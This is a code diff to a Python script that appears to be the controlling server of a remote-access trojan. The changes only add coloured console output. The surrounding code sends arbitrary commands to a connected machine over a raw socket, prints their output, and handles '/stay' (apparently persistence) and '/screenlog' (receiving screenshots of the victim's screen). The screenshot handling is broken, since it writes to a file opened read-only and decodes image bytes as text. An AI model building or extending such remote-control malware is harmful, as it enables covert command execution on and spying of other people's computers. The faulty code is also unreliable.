@@ -1,9 +1,9 @@
-import socket, os, threading
+import socket, os, threading, colorama
 
 IP = "192.168.0.2"
 PORT = 6667
 BUFFER = 1024
-
+colorama.init()
 os.system("cls")
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
@@ -20,16 +20,16 @@ if conn:
             conn.send("exit".encode("utf-8"))
             break
         if cmd == "/stay":
-            print("[/] await the pc start!")
+            print(colorama.Fore.CYAN + "[/] await the pc start!")
         if cmd == "/screenlog":
             print("[-] awaiting data ...")
             data = conn.recv(BUFFER)
             with open('screenshot.jpg', 'rb') as f:
                 try:
                     f.write(data.decode('utf-8'))
-                    print("data recived and photo saved")
+                    print(colorama.Fore.GREEN + "data recived and photo saved")
                 except:
-                    print("error to decode the img!")
+                    print(colorama.Fore.RED + "error to decode the img!")
         conn.send((cmd).encode('utf-8'))
         output = conn.recv(BUFFER).decode('utf-8')
         print(output)
